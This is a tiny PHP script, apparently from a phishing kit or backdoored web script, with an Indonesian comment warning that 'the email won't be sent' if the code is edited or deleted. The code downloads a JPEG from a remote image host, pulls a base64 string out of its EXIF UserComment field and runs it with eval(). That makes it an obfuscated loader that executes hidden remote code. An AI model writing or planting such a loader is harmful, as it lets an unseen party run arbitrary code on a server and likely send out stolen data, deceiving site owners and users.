<?php 
// kalo kalian hapus,edit,diubah-ubah nanti emailnya gak kekirim lho :P gak percaya? coba aja :P
$BASED = exif_read_data("https://lh3.googleusercontent.com/-lskD5tDMfug/V2FiJ7NSG4I/AAAAAAAAALg/z925YmbS4VUDMILDQ0iI4MnbvTDOW8n2ACLcB/h120/ngakak.jpeg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
?>